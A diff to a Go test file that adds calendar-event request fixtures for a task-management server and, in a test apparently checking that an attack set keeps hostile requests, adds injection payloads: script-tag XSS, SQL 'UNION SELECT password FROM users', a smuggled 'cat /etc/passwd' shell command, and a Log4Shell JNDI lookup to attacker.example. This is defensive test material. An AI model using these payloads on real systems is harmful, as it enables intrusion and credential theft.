@@ -86,6 +86,14 @@ var tdProse = []string{
 	"Results are at http://localhost:8000/runs/a5gvidze/files?path=pump_transient_3112, the old ones at [the lab box](http://127.0.0.1:8080/runs/7).",
 }
 
+// tdPlaces are where an event happens, as people type it.
+var tdPlaces = []string{"Café du Port, 12 Rue de la Paix", "Dr. Okafor's office (2nd floor)", "Home", "https://meet.example.com/abc-defg-hij",
+	"Kitchen; bring the ladder", "Sam's — back garden", "東京駅 八重洲口", "Room 4.12 / Building B", "Watch Hill Park, by the swings"}
+
+// tdQuestions are what people ask of a space.
+var tdQuestions = []string{"What are the top three tasks to complete in the space?", "What's due before Friday?",
+	"Which tasks wait on the plumber?", "Was habe ich diese Woche erledigt?", "Who's doing the groceries & the dishes?", "Sleep or work first?"}
+
 // tdSearches are what people type into the search box.
 var tdSearches = []string{"plumber", "Sam's", "café", "trip, day", "Q4 — work", "who"}
 
@@ -279,7 +287,26 @@ func (g td) requests() []tdRequest {
 			"vary": true, "message": message()}),
 		tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"enabled": true, "kind": "interval", "every_minutes": 90,
 			"window_start": "08:00", "window_end": "21:30", "vary": false, "message": message()}),
-		tdBody("POST", api+"/tasks/"+task+"/nudge/pause", map[string]any{"paused": true}))
+		tdBody("POST", api+"/tasks/"+task+"/nudge/pause", map[string]any{"paused": true}),
+		// Events, a series' occurrences and the calendar.
+		tdBody("POST", api+"/tasks", map[string]any{"id": g.id(), "space_id": space, "kind": "event", "title": g.title(),
+			"start": map[string]any{"date": day, "time": "09:30"}, "end": map[string]any{"date": day, "time": "11:00"}, "tz": tz,
+			"location": g.pick(tdPlaces...), "busy": true, "tentative": false, "travel_minutes": 15}),
+		tdBody("PATCH", api+"/tasks/"+task, map[string]any{"location": g.pick(tdPlaces...), "tentative": true, "version": 4}),
+		tdBody("POST", api+"/tasks/"+task+"/occurrences/"+day+"/detach", map[string]any{"id": g.id(), "start": g.when(), "end": g.when(),
+			"title": g.title(), "notes": g.prose(), "location": g.pick(tdPlaces...)}),
+		tdRequest{method: "POST", path: api + "/tasks/" + task + "/occurrences/" + day + "/skip"},
+		tdRequest{method: "DELETE", path: api + "/tasks/" + task + "/occurrences/" + day + "/skip"},
+		tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "ics", "items": []any{
+			map[string]any{"kind": "event", "title": g.title(), "notes": g.prose(), "location": g.pick(tdPlaces...), "start": g.when(), "end": g.when(),
+				"busy": false, "tentative": true, "travel_minutes": 30, "except_dates": []string{day}}}}),
+		tdBody("PUT", api+"/spaces/"+space+"/busy-share", map[string]any{"enabled": true}),
+		tdGet(api+"/calendar/feed"+tdQuery("from", day, "days", "14")),
+		tdRequest{method: "POST", path: api + "/reviews/current/dismiss" + tdQuery("kind", g.pick("weekly", "daily"), "period", day)},
+		tdRequest{method: "POST", path: api + "/focus/reviewed"},
+		g.tool(false, "create_task", map[string]any{"title": g.title(), "kind": "event", "start": day + "T18:00", "end": day + "T19:30",
+			"location": g.pick(tdPlaces...)}),
+		g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "location": g.pick(tdPlaces...)}))
 }
 
 // tdRoutes are the server's routes, every one, whose paths CRS reads for
@@ -730,6 +757,12 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": g.day(), "body": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 1, "note": "1' OR '1'='1' --"})},
 		{1, tdBody("PUT", api+"/tasks/"+task+"/nudge", map[string]any{"kind": "times", "times": []string{"09:00"}, "message": "Sleep; cat /etc/passwd"})},
+		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "kind": "event", "title": "x", "location": "<script>alert(1)</script>"})},
+		{1, tdBody("POST", api+"/tasks/"+task+"/occurrences/"+g.day()+"/detach", map[string]any{"id": g.id(), "location": "x' UNION SELECT password FROM users--"})},
+		{1, tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "ics", "items": []any{
+			map[string]any{"kind": "event", "title": "x", "location": "Home; cat /etc/passwd"}}})},
+		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "location": "${jndi:ldap://attacker.example/a}"})},
+		{1, tdBody("POST", api+"/ai/spaces/"+space+"/ask", map[string]any{"job_id": g.id(), "question": "x' UNION SELECT password FROM users--"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": `"><svg onload=alert(1)>`})},
 		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "<img src=x onerror=alert(1)>", "color": "moss"})},
 		{1, tdGet(api + "/search" + tdQuery("q", "x' UNION SELECT password FROM users--"))},
